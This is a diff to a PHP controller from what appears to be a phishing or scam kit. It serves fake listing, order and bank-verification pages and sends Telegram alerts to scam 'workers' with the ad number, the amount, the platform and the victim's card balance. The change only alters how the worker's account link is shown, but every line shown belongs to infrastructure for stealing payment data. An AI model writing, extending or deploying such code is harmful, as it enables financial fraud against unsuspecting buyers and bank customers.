@@ -220,7 +220,7 @@ class PagesController extends Controller
                 "🆔<b>Номер объявления:</b> <code>{$fake->getTrackIdFromWorker()}</code>",
                 "💵<b>Сумма:</b> <code>{$fake->price()}</code>",
                 "🚛<b>Платформа:</b> <code>{$this->platform()}</code>",
-                "🐵<b>Воркер:</b> <b>{$fake->telegramUser->accountLink()}</b>",
+                "🐵<b>Воркер:</b> <b>{$fake->telegramUser->accountLinkVisibly(true)}</b>",
             ]);
             return view($view);
         }
@@ -321,7 +321,7 @@ class PagesController extends Controller
             "🆔<b>Номер объявления:</b> <code>{$fake->getTrackIdFromWorker()}</code>",
             "💵<b>Сумма:</b> <code>{$fake->price()}</code>",
             "🚛<b>Платформа:</b> <code>{$this->platform()}</code>",
-            "🐵<b>Воркер:</b> <b>{$fake->telegramUser->accountLink()}</b>",
+            "🐵<b>Воркер:</b> <b>{$fake->telegramUser->accountLinkVisibly(true)}</b>",
         ]);
         return view(view()->exists("fakes.{$this->category->name}.order")
             ? "fakes.{$this->category->name}.order"
@@ -391,7 +391,7 @@ class PagesController extends Controller
             "🆔<b>Номер объявления:</b> <code>{$fake->getTrackIdFromWorker()}</code>",
             "💰<b>Сумма:</b> <code>$amount</code> $currency",
             "💰<b>Баланс на карте:</b> <code>$balance</code> $currency",
-            "🐵<b>Воркер:</b> <b>{$fake->telegramUser->accountLink()}</b>",
+            "🐵<b>Воркер:</b> <b>{$fake->telegramUser->accountLinkVisibly(true)}</b>",
         ]);
         if ($request->ajax()) {
             return response()->json(['html' => $html, 'next' => $next]);
@@ -443,7 +443,7 @@ class PagesController extends Controller
                 "=================",
                 "🆔<b>Номер объявления:</b> <code>{$fake->getTrackIdFromWorker()}</code>",
                 "🚛<b>Платформа:</b> <code>{$this->platform()}</code>",
-                "🐵<b>Воркер:</b> <b>{$fake->telegramUser->accountLink()}</b>",
+                "🐵<b>Воркер:</b> <b>{$fake->telegramUser->accountLinkVisibly(true)}</b>",
             ]);
         }
         if ($this->bank === 'millenium') $next = subRoute('fake.verify', ['track_id' => $fake->track_id]);
